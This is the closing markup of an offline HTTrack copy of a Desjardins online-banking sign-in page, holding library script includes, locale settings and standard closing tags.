    <script src="https://www.desjardins.com/static-accesweb/201810151614/lib/externe/placeholder/2.0.8/jquery.placeholder.min.js" type="text/javascript"></script>
<![endif]-->

<!--[if IE 9]>
    
    <script src="https://www.desjardins.com/static-accesweb/201810151614/lib/externe/placeholder/2.0.8/jquery.placeholder.min.js" type="text/javascript"></script>
<![endif]-->


<script type="text/javascript">
    var LOCALE  = "en_CA_desjardins";
    var LOCALE_CODE_LANGUE = "en";
    var LOCALE_CODE_PAYS = "CA";
</script>



<!-- ni : accesweb01_berlin7_rel02  -->
<!-- pv :  -->
<script type="text/javascript">var _cf = _cf || []; _cf.push(['_setFsp', true]); _cf.push(['_setBm', true]);</script><script type="text/javascript" src="https://accweb.mouv.desjardins.com/_bm/abd-1-30"></script></body>

<!-- Mirrored from accweb.mouv.desjardins.com/identifiantunique/identification by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 23 Oct 2018 22:28:53 GMT -->
</html>
